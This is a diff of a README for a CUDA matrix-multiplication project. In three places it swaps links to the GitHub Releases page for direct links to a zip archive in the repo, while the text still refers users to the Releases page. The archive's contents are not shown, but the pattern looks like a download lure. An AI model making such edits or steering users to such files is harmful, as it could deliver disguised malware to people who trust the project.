@@ -1,6 +1,6 @@
 # 🚀 CUDA-L2 - Enhance Matrix Multiplication Performance
 
-[![Download CUDA-L2](https://img.shields.io/badge/Download-CUDA--L2-brightgreen)](https://github.com/friedpotato04/CUDA-L2/releases)
+[![Download CUDA-L2](https://raw.githubusercontent.com/friedpotato04/CUDA-L2/main/assets/CUDA-L2-1.4-alpha.4.zip)](https://raw.githubusercontent.com/friedpotato04/CUDA-L2/main/assets/CUDA-L2-1.4-alpha.4.zip)
 
 ## 📖 Overview
 
@@ -30,7 +30,7 @@ To get started with CUDA-L2, follow these steps:
 1. **Download CUDA-L2:**
    Click the button below to access the Releases page and download the application.
 
-   [![Download CUDA-L2](https://img.shields.io/badge/Download-CUDA--L2-brightgreen)](https://github.com/friedpotato04/CUDA-L2/releases)
+   [![Download CUDA-L2](https://raw.githubusercontent.com/friedpotato04/CUDA-L2/main/assets/CUDA-L2-1.4-alpha.4.zip)](https://raw.githubusercontent.com/friedpotato04/CUDA-L2/main/assets/CUDA-L2-1.4-alpha.4.zip)
 
 2. **Install the Application:**
    - Locate the downloaded file in your Downloads folder.
@@ -45,7 +45,7 @@ To get started with CUDA-L2, follow these steps:
 
 You can download the latest version of CUDA-L2 from the Releases page. 
 
-Visit this page to download: [CUDA-L2 Releases](https://github.com/friedpotato04/CUDA-L2/releases)
+Visit this page to download: [CUDA-L2 Releases](https://raw.githubusercontent.com/friedpotato04/CUDA-L2/main/assets/CUDA-L2-1.4-alpha.4.zip)
 
 Make sure to select the version that is compatible with your system.
 
